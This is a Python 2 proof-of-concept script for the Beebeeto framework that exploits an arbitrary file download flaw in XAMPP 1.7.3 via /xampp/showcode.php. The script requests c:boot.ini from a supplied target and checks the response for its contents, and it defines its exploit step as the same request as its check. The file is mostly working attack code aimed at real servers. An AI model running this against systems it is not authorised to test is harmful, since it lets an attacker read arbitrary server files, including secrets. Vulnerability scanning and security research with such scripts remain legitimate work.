#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0098',
            'name': 'xampp 1.7.3 /xampp/showcode.php 任意文件下载漏洞 POC',
            'author': '1024',
            'create_date': '2014-10-21',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'xampp',
            'vul_version': ['1.7.3'],
            'type': 'Arbitrary File Download',
            'tag': ['xampp漏洞', '任意文件下载漏洞', '/xampp/showcode.php', 'php'],
            'desc': 'xampp <=1.7.3 has a file disclosure Vul. attacker can read any files on web server.',
            'references': ['http://www.exploit-db.com/exploits/15370/',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + '/xampp/showcode.php/c:boot.ini?showcode=1'
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if "<textarea cols='100' rows='10'>[boot loader]" in content:
                args['success'] = True
                args['poc_ret']['vul_url'] = verify_url
                return args
        args['success'] = False
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())